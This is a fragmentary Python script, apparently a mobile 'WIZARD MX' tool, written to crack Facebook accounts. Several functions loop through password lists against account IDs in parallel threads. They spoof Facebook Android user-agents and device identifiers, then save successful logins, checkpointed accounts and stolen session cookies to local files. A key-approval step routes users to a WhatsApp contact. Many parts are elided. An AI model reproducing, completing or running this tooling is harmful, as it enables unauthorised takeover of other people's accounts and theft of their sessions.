...
device = {
        ...
        'fbca':fbca,
        'fbdm':fbdm}
sys.stdout.write('\x1b]2; WIZARD MX \x07')
logo=("""\033[1;32m
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;32
...
\033[1;37m===========================================
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mAuthor  : \033[1;37mWIZARD
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mGithub  : \033[1;37mWIZARD T-2
        ...
        #    linex()
            ...
            if xd in ['1','01']:
                ...
                with tred(max_workers=30) as crack_submit:
                    ...
                    print("\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mWIZARD Crack Has Been Running ")
                    linex()
                    for user in fo:
                ...
                exit()
                 ...
                 os.system('xdg-open https://www.facebook.com/@wizardsmix')
            elif xd in ['5','05']:
                 os.system('xdg-open https://t.me/@wizardsmix')
            elif xd in ['0','00']:
                exit(' Thanks for use ♥ ')
            else:
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [WIZARD-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FB4A/;FBAV/;FBBV/689860502;FBAN/FB4A;FBAV/;FBBV/689860502;FBDM//*{density=1.5,width=720,height=1920};FBLC/it_IT;FBRV/440269489;FBCR/TECNO;FBMF/Motorola;FBBD/itel;FBPN/com.facebook.katana;FBDV/Galaxy_S21;FBSV/14;FBOP/4;FBCA/armeabi-v7a;FBSS/;]"
                li = ['28','29','210']
                ...
                q = json.loads(po)
                if 'session_key' in q:
                    print('\r\r\033[1;32m [WIZARD-OK] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/WIZARD/WIZARD-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [WIZARD-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/WIZARD/WIZARD-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/WIZARD/WIZARD-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [WIZARD-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FB4A/;FBAV/A1XDL5U4;FBBV/128175989;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/128175989;FBDM//*{density=3.0,width=1080,height=2560};FBLC/it_IT;FBRV/331579275;FBCR/Realme;FBMF/Xiaomi;FBBD/Sharp;FBPN/com.facebook.katana;FBDV/Redmi_10;FBSV/15;FBOP/5;FBCA/armeabi-v7a;FBSS/17;]"
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/WIZARD/WIZARD-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [WIZARD-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/;FBAV/YZWSES93;FBBV/343238630;FBAN/FBAN;FBAV/YZWSES93;FBBV/343238630;FBDM//*{density=2.5,width=2560,height=4096};FBLC/es_ES;FBRV/215843236;FBCR/TECNO;FBMF/Motorola;FBBD/Parla;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_Mix_9;FBSV/16;FBOP/4;FBCA/arm64-v8a;FBSS/;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [WIZARD-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/WIZARD/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/WIZARD/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [WIZARD-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/WIZARD/WIZARD-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/WIZARD/.WIZARD.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/WIZARD/.WIZARD.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        input(' Exit And Again Run The Command');os.system('python DEVIL.py')
        tks = ('Hello%20WIZARD%20Owner%20Kashif%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213558926136?text='+tks)
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20WIZARD%20Owner%20WIZARD-XD%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213558926136?text='+tks)
        main_apv()
menu()
